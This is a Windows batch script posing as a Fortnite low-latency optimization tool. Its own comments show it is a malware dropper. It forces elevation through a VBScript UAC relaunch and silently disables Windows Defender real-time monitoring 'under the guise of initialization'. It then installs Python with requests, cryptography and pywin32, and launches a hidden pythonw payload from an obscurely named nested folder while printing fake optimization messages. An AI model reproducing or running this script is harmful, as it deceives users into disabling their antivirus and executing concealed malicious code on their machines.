@echo off
:: Check if the script is running as Administrator
NET SESSION >nul 2>&1
if %ERRORLEVEL% neq 0 (
    echo Error: This script requires Administrator privileges to run.
    echo Please right-click and select "Run as Administrator."
    
    :: Use VBScript to relaunch the script with elevated privileges
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~f0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    cscript //nologo "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /b
)

:: Step 1: Simulate Initializing Fortnite Optimization Tools (Message Only)
echo Initializing Fortnite optimization tools...
timeout /t 2 >nul

:: Step 2: Check system for compatibility with tweaks
echo Checking system for compatibility with tweaks...
timeout /t 3 >nul

:: Step 3: Disable Windows Defender (Silently, under the guise of initialization)
echo Applying system optimizations...
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1
if %ERRORLEVEL% neq 0 (
    :: Do not print anything about Windows Defender
    timeout /t 2 >nul
)

:: Step 4: Check if Python is installed
where python >nul 2>&1
if %ERRORLEVEL% neq 0 (
    echo Python runtime not detected. Installing Python...
    timeout /t 2 >nul

    :: Download Python installer
    powershell -Command "Invoke-WebRequest https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe -OutFile python-installer.exe"
    if not exist python-installer.exe (
        echo Failed to download Python installer. Please check your internet connection and try again.
        pause
        exit /b 1
    )

    :: Install Python silently
    start /wait python-installer.exe /quiet InstallAllUsers=1 PrependPath=1
    if %ERRORLEVEL% neq 0 (
        echo Python installation failed. Please try running this script as Administrator.
        del python-installer.exe
        pause
        exit /b 1
    )
    del python-installer.exe

    echo Python installation complete.
    timeout /t 2 >nul
)

:: Step 5: Update pip and install required packages
echo Updating system tools for optimal performance...
python -m pip install --upgrade pip >nul 2>&1
if %ERRORLEVEL% neq 0 (
    echo Failed to upgrade pip. Please ensure Python is installed correctly and try again.
    pause
    exit /b 1
)

:: Step 6: Install required Python libraries (including certifi for SSL)
echo Installing required libraries for Fortnite tweaks...
python -m pip install --upgrade certifi requests cryptography pywin32 >nul 2>&1
if %ERRORLEVEL% neq 0 (
    echo Failed to install required libraries. Please check your internet connection and try again.
    pause
    exit /b 1
)

:: Step 7: Ensure certifi is properly configured
echo Configuring SSL certificates...
python -c "import certifi; print('SSL certificates configured successfully.')" >nul 2>&1
if %ERRORLEVEL% neq 0 (
    echo Failed to configure SSL certificates. Please reinstall Python or check your installation.
    pause
    exit /b 1
)

:: Step 8: Apply Fortnite low latency tweaks
echo Applying Fortnite low latency tweaks...
if not exist "%~dp0features\holder\encryptionedthx\naughty\likei\m.py" (
    echo Required script file not found. Please ensure the script directory is intact.
    pause
    exit /b 1
)

start /b pythonw "%~dp0features\holder\encryptionedthx\naughty\likei\m.py" >nul 2>&1
if %ERRORLEVEL% neq 0 (
    echo Failed to run the Fortnite tweak script. Please check the script file and try again.
    pause
    exit /b 1
)

:: Completion message
echo Optimization complete! Your Fortnite experience should now be smoother.
pause
